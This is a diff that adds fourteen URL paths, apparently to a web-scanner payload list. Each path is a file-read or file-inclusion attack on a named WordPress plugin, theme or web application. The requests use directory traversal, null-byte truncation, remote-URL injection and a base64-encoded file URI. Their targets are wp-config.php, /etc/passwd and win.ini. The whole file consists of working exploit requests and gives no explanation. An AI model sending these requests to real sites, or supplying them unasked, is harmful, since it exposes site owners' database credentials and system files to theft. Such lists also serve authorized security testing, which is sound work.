@@ -1,0 +1,14 @@
+/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10
+/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00
+/wp-content/plugins/brandfolder/callback.php?wp_abspath=http://google.com/
+/dharma-booking/frontend/ajax/gateways/proccess.php?gateway=../../../../../../etc/passwd%00
+/?mdocs-img-preview=../../../wp-config.php
+/mdocs-posts/?mdocs-img-preview=../../../wp-config.php
+/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
+/wp-content/plugins/xml-and-csv-import-in-article-content/upload-process.php
+/wp-content/plugins/abtest/abtest_admin.php?action=/etc/passwd
+/wp-content/plugins/image-export/download.php?file=../../../wp-config.php
+/wp-content/plugins/site-import/admin/page.php?url=..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
+/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php
+/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://google.com/
+/wp-content/plugins/robotcpa/f.php?l=ZmlsZTovLy9ldGMvcGFzc3dk
